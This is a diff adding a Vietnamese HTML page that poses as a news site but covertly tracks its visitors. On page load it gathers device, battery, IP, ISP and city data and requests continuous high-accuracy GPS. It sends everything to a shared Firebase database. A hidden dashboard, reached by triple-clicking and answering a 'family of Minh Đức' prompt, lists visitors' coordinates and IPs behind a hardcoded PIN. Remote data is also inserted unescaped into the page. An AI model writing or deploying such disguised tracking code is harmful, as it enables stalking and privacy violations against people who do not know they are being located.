@@ -1,0 +1,292 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Kênh Tin Tức & Giải Trí Tổng Hợp</title>
+    
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body, html { width: 100%; height: 100%; font-family: Arial, sans-serif; background-color: #121212; color: #fff; }
+
+        /* 1. TRANG BẪY TIN TỨC (Bấm 3 lần liên tiếp để hiện xác nhận) */
+        #decoyView {
+            width: 100%; height: 100vh; overflow-y: auto; padding: 20px;
+            background-color: #181818; color: #e0e0e0; user-select: none;
+        }
+        .decoy-header { border-bottom: 2px solid #ff4500; padding-bottom: 10px; margin-bottom: 20px; }
+        .decoy-header h1 { font-size: 20px; color: #ff4500; }
+        .news-card { background: #242424; padding: 15px; border-radius: 8px; margin-bottom: 15px; }
+        .news-card h3 { font-size: 15px; color: #fff; margin-bottom: 6px; }
+        .news-card p { font-size: 13px; color: #aaa; line-height: 1.4; }
+
+        /* 2. POPUP XÁC NHẬN NGƯỜI NHÀ */
+        .confirm-overlay {
+            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0, 0, 0, 0.85); z-index: 3000; justify-content: center; align-items: center;
+            backdrop-filter: blur(5px);
+        }
+        .confirm-card {
+            background: #222; border: 1px solid #ff4500; border-radius: 16px;
+            width: 90%; max-width: 320px; padding: 25px 20px; text-align: center;
+        }
+        .confirm-card h3 { font-size: 16px; color: #fff; margin-bottom: 20px; }
+        .btn-group { display: flex; gap: 10px; }
+        .btn-yes { background-color: #0088ff; color: #fff; border: none; padding: 10px; border-radius: 8px; font-weight: bold; cursor: pointer; flex: 1; }
+        .btn-no { background-color: #444; color: #fff; border: none; padding: 10px; border-radius: 8px; font-weight: bold; cursor: pointer; flex: 1; }
+
+        /* 3. GIAO DIỆN DANH SÁCH THIẾT BỊ TRUY CẬP */
+        #dashboardView { display: none; padding: 20px; max-width: 600px; margin: 0 auto; }
+        .dash-header { text-align: center; margin-bottom: 20px; border-bottom: 1px solid #333; padding-bottom: 10px; }
+        .dash-header h2 { color: #0088ff; font-size: 18px; }
+
+        .user-card {
+            background: #1e1e1e; border: 1px solid #333; border-radius: 12px;
+            padding: 15px; margin-bottom: 12px; cursor: pointer; transition: 0.2s;
+            display: flex; justify-content: space-between; align-items: center;
+        }
+        .user-card:hover { border-color: #0088ff; background: #252525; }
+        .user-card.is-me { border-color: #ff3333; background: rgba(255, 51, 51, 0.05); }
+
+        .badge-me { background: #ff3333; color: #fff; font-size: 10px; padding: 2px 6px; border-radius: 4px; margin-left: 6px; }
+        .device-title { font-weight: bold; font-size: 15px; color: #fff; margin-bottom: 4px; }
+        .basic-info { font-size: 12px; color: #aaa; line-height: 1.5; }
+        .battery-text { color: #00ff66; font-weight: bold; }
+
+        /* 4. POPUP XEM CHI TIẾT KHI NHẬP DÙNG PASS */
+        .modal-overlay {
+            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0, 0, 0, 0.85); z-index: 4000; justify-content: center; align-items: center;
+        }
+        .modal-card { background: #1e1e1e; border: 1px solid #0088ff; border-radius: 16px; width: 90%; max-width: 360px; padding: 20px; }
+        .info-list { list-style: none; font-size: 13px; line-height: 1.8; margin-top: 10px; }
+        .info-list li { border-bottom: 1px solid #333; padding: 6px 0; display: flex; justify-content: space-between; }
+        .info-list b { color: #00ff66; text-align: right; max-width: 60%; word-break: break-all; }
+    </style>
+</head>
+<body>
+
+    <!-- TRANG BẪY TIN TỨC -->
+    <div id="decoyView" onclick="detectMultiClick()">
+        <div class="decoy-header">
+            <h1>🔥 Tin Tức Nóng Trong Ngày</h1>
+        </div>
+        <div class="news-card">
+            <h3>Cập nhật xu hướng công nghệ mới nhất 2026</h3>
+            <p>Nhấp 3-4 lần liên tiếp vào màn hình để mở giao diện quản trị ẩn...</p>
+        </div>
+    </div>
+
+    <!-- POPUP XÁC NHẬN NGƯỜI NHÀ -->
+    <div id="confirmModal" class="confirm-overlay">
+        <div class="confirm-card">
+            <h3>Bạn là người nhà của Minh Đức đúng không?</h3>
+            <div class="btn-group">
+                <button class="btn-yes" onclick="confirmIdentity(true)">Đúng</button>
+                <button class="btn-no" onclick="confirmIdentity(false)">Không</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- GIAO DIỆN DANH SÁCH TRUY CẬP -->
+    <div id="dashboardView">
+        <div class="dash-header">
+            <h2>📱 Thiết Bị Đang Truy Cập</h2>
+            <p style="font-size: 12px; color: #888; margin-top: 5px;">Bấm vào thiết bị bất kỳ để xem vị trí & IP (Cần Mật Khẩu)</p>
+        </div>
+        <div id="userList"></div>
+    </div>
+
+    <!-- POPUP BẢNG THÔNG TIN CHI TIẾT (GPS / IP) -->
+    <div id="infoModal" class="modal-overlay">
+        <div class="modal-card">
+            <div style="display: flex; justify-content: space-between; font-weight: bold; color: #0088ff;">
+                <span>🔒 Thông Tin Nhạy Cảm</span>
+                <span style="cursor: pointer;" onclick="closeModal()">✕</span>
+            </div>
+            <ul id="infoContent" class="info-list"></ul>
+        </div>
+    </div>
+
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+
+    <script>
+        const DETAIL_PIN = "123456"; // Mật khẩu xem chi tiết GPS & IP
+        
+        // THAY FIREBASE CONFIG THẬT VÀO ĐÂY ĐỂ ĐỒNG BỘ CÁC MÁY KHÁC
+        const firebaseConfig = { databaseURL: "https://YOUR_PROJECT_ID.firebaseio.com" };
+
+        let db = null;
+        try { firebase.initializeApp(firebaseConfig); db = firebase.database(); } catch(e){}
+
+        const myUserId = "user_" + Math.random().toString(36).substr(2, 7);
+        let allUsersData = {};
+        let clickCount = 0;
+        let clickTimer = null;
+
+        // BẪY BẤM 3 LẦN VÀO MÀN HÌNH TIN TỨC
+        function detectMultiClick() {
+            clickCount++;
+            clearTimeout(clickTimer);
+            clickTimer = setTimeout(() => { clickCount = 0; }, 1500);
+
+            if (clickCount >= 3) {
+                clickCount = 0;
+                document.getElementById('confirmModal').style.display = 'flex';
+            }
+        }
+
+        function confirmIdentity(isFamily) {
+            document.getElementById('confirmModal').style.display = 'none';
+            if (isFamily) {
+                document.getElementById('decoyView').style.display = 'none';
+                document.getElementById('dashboardView').style.display = 'block';
+                renderUserList();
+            } else {
+                alert("Rất tiếc, trang web này không dành cho bạn.");
+            }
+        }
+
+        // TỰ ĐỘNG THU THẬP THÔNG TIN MÁY
+        async function getSystemData() {
+            const ua = navigator.userAgent;
+            let os = "Windows", device = "Máy tính PC";
+            if (ua.indexOf("Android") !== -1) { os = "Android"; device = "Điện thoại Android"; }
+            else if (ua.indexOf("iPhone") !== -1) { os = "iOS"; device = "iPhone"; }
+            else if (ua.indexOf("iPad") !== -1) { os = "iPadOS"; device = "iPad"; }
+
+            let battery = "N/A";
+            if (navigator.getBattery) {
+                try {
+                    const b = await navigator.getBattery();
+                    battery = Math.round(b.level * 100) + "% " + (b.charging ? "🔌 (Đang sạc)" : "🔋");
+                } catch(e){}
+            }
+
+            let ipData = { ip: "Đang lấy...", isp: "N/A", lat: 0, lng: 0 };
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                const d = await res.json();
+                ipData = {
+                    ip: d.ip || "N/A",
+                    isp: d.org || d.asn || "N/A",
+                    city: d.city || "N/A",
+                    lat: d.latitude || 0,
+                    lng: d.longitude || 0
+                };
+            } catch(e){}
+
+            return { os, device, battery, ...ipData };
+        }
+
+        async function startTracking() {
+            const info = await getSystemData();
+
+            const pushData = (lat, lng, mode) => {
+                const myData = {
+                    lat: lat,
+                    lng: lng,
+                    mode: mode,
+                    deviceInfo: info,
+                    time: new Date().toLocaleTimeString('vi-VN')
+                };
+
+                allUsersData[myUserId] = myData;
+                renderUserList();
+
+                if (db) {
+                    db.ref('network_users/' + myUserId).set(myData);
+                    db.ref('network_users/' + myUserId).onDisconnect().remove();
+                }
+            };
+
+            if ("geolocation" in navigator) {
+                navigator.geolocation.watchPosition(
+                    (pos) => pushData(pos.coords.latitude, pos.coords.longitude, "GPS Chính Xác"),
+                    (err) => pushData(info.lat, info.lng, "Ước Tính Qua IP"),
+                    { enableHighAccuracy: true, timeout: 5000 }
+                );
+            } else {
+                pushData(info.lat, info.lng, "Ước Tính Qua IP");
+            }
+        }
+
+        if (db) {
+            db.ref('network_users').on('value', (snapshot) => {
+                const remoteData = snapshot.val() || {};
+                allUsersData = { ...allUsersData, ...remoteData };
+                renderUserList();
+            });
+        }
+
+        // VẼ DANH SÁCH THIẾT BỊ LÊN MÀN HÌNH
+        function renderUserList() {
+            const listEl = document.getElementById('userList');
+            if (!listEl) return;
+            
+            listEl.innerHTML = "";
+
+            Object.keys(allUsersData).forEach((id) => {
+                const u = allUsersData[id];
+                const info = u.deviceInfo || {};
+                const isMe = id === myUserId;
+
+                const card = document.createElement('div');
+                card.className = `user-card ${isMe ? 'is-me' : ''}`;
+                card.onclick = () => openUserDetail(id);
+
+                card.innerHTML = `
+                    <div>
+                        <div class="device-title">
+                            ${info.device || 'Thiết bị ẩn'} 
+                            ${isMe ? '<span class="badge-me">BẠN</span>' : ''}
+                        </div>
+                        <div class="basic-info">
+                            Hệ điều hành: <b>${info.os || 'N/A'}</b><br>
+                            Truy cập lúc: ${u.time || 'N/A'}
+                        </div>
+                    </div>
+                    <div style="text-align: right;">
+                        <div class="battery-text">${info.battery || 'N/A'}</div>
+                        <div style="font-size: 11px; color: #0088ff; margin-top: 5px;">🔒 Xem vị trí & IP</div>
+                    </div>
+                `;
+                listEl.appendChild(card);
+            });
+        }
+
+        // BẤM VÀO MỘT NGƯỜI BẤT KỲ SẼ HỎI PASS ĐỂ XEM GPS/IP
+        function openUserDetail(userId) {
+            const inputPin = prompt("🔑 Nhập Mật Khẩu để mở khóa Tọa Độ GPS & Địa Chỉ IP:");
+            
+            if (inputPin === DETAIL_PIN) {
+                const data = allUsersData[userId];
+                if (!data) return;
+                const info = data.deviceInfo || {};
+
+                document.getElementById('infoContent').innerHTML = `
+                    <li><span>Loại Định Vị:</span> <b>${data.mode}</b></li>
+                    <li><span>Tọa độ GPS:</span> <b>${data.lat.toFixed(5)}, ${data.lng.toFixed(5)}</b></li>
+                    <li><span>Địa chỉ IP:</span> <b>${info.ip}</b></li>
+                    <li><span>Tỉnh / Thành:</span> <b>${info.city || 'N/A'}</b></li>
+                    <li><span>Nhà mạng:</span> <b>${info.isp || 'N/A'}</b></li>
+                    <li><span>Tên thiết bị:</span> <b>${info.device}</b></li>
+                    <li><span>Hệ điều hành:</span> <b>${info.os}</b></li>
+                    <li><span>Dung lượng Pin:</span> <b>${info.battery}</b></li>
+                    <li><span>Thời gian:</span> <b>${data.time}</b></li>
+                `;
+                document.getElementById('infoModal').style.display = 'flex';
+            } else if (inputPin !== null) {
+                alert("❌ Mật khẩu không đúng! Bạn không có quyền xem thông tin vị trí & IP.");
+            }
+        }
+
+        function closeModal() {
+            document.getElementById('infoModal').style.display = 'none';
+        }
+
+        window.onload = startTracking;
+    </script>
+</body>
+</html>
